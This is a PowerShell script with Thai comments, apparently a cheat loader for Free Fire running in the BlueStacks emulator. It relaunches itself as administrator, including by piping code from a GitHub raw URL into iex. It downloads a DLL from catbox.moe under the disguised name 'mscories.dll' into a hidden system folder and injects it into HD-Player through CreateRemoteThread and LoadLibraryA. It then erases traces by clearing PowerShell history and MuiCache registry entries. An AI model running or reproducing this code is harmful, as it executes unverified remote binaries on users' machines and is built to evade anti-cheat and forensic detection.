# 1. ขอสิทธิ์ Administrator (จำเป็นสำหรับการจัดการ Memory ของโปรเซสอื่น)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $myPath = $MyInvocation.MyCommand.Definition
    if ($myPath) {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$myPath`"" -Verb RunAs
    } else {
        # กรณี Copy-Paste ลง Console ตรงๆ
        $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex ((iwr 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1' -UseBasicParsing).Content)"
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
    }
    exit
}

# 2. ตั้งค่าไฟล์และการพรางตัว
$url = "https://files.catbox.moe/0ukxya.dll" 
$fakeName = "mscories.dll" 
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player" 
$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"

# 3. เตรียมที่เก็บไฟล์แบบพรางตัว
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

# 4. ดาวน์โหลด DLL
Write-Host "[*] Downloading components..." -ForegroundColor Cyan
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'
try {
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "[!] Download failed." -ForegroundColor Red; exit
}

# 5. C# Code สำหรับ Manual Injection (Win32 API)
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# 6. เริ่มกระบวนการ Inject
if (Test-Path $dllPath) {
    Write-Host "[*] Checking for $targetProcess..." -ForegroundColor Cyan
    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
    
    if (!$proc) {
        Write-Host "[*] Launching BlueStacks..." -ForegroundColor Yellow
        Start-Process $blueStacksPath
        Start-Sleep -Seconds 10 # รอให้โปรแกรมโหลดเข้า Memory
        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
    }

    if ($proc) {
        Write-Host "[+] Injecting into PID: $($proc.Id)..." -ForegroundColor Green
        try {
            Add-Type -TypeDefinition $Source
            [Injector]::Inject($proc.Id, $dllPath)
            Write-Host "[+] Injection successful." -ForegroundColor Green
        } catch {
            Write-Host "[!] Injection failed: $_" -ForegroundColor Red
        }
    }
}

# 7. --- การลบร่องรอย (The Ghost Clean - No Explorer Restart) ---
Write-Host "[*] Cleaning up traces..." -ForegroundColor Gray
Start-Sleep -Seconds 3

# ลบไฟล์ DLL (ระวัง: ถ้า DLL กำลังถูกใช้งานอยู่ อาจลบไม่ได้ทันทีจนกว่าจะปิดเกม)
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

# ล้างประวัติ PowerShell
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
Clear-History

# ล้างค่าใน Registry (MuiCache) โดยไม่รีสตาร์ทเครื่อง
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
if (Test-Path $muiPath) {
    Get-Item -Path $muiPath | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
        Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
    }
}

Write-Host "[+] Done. System is ready." -ForegroundColor Green